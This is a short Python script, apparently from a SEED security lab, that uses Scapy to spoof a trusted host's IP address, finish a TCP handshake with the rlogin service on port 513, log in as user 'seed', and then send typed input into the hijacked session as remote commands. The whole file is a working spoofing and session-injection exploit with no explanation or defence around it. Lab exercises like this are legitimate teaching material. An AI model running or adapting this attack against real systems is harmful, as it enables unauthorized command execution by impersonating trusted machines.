#!/usr/local/bin/python
from scapy.all import *

src = "10.9.0.6" 
dst = "10.9.0.5" 
sport = 1023 
dport = 513 

print("Starting IP spoofing")

# SYN
ip=IP(src=src, dst=dst)
SYN=TCP(sport=sport,dport=dport,flags='S',seq=1000)
SYNACK=sr1(ip/SYN)
print("Starting SYN with target: IP - "+ str(dst) + ", Port - ", dport) 

print("Waiting for response...")
# ACK
ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
send(ip/ACK)
print("Response Received!")
print("ACK response sent: IP - "+ str(dst) + ", Port - ", dport) 

# Send Rlogin - Start Handshake
print("Starting Rlogin handshake")
data = "seed\000seed\000xterm/38400\000"
flag = "\00"
AP=TCP(sport=sport, dport=dport, flags='PA', seq=SYNACK.ack, ack=SYNACK.seq + 1)
ACKLOGIN = sr1(ip/AP/flag/data, verbose=0)

# Send ACK for Rlogin
ACK=TCP(sport=sport, dport=dport, flags='A', seq=1000, ack=ACKLOGIN.seq + 1)
send(ip/ACK)
print("ACK response sent: IP - "+ str(dst) + ", Port - ", dport) 
print("Rlogin handshake completed!")

while True:
    # Send ACK for Rlogin
    data=input("Terminal X input:") 
    ACK=TCP(sport=sport, dport=dport, flags='AP', seq=ACKLOGIN.ack, ack=ACKLOGIN.seq + 1)
    send(ip/ACK/data)
    print("ACK response sent: IP - "+ str(dst) + ", Port - ", dport) 
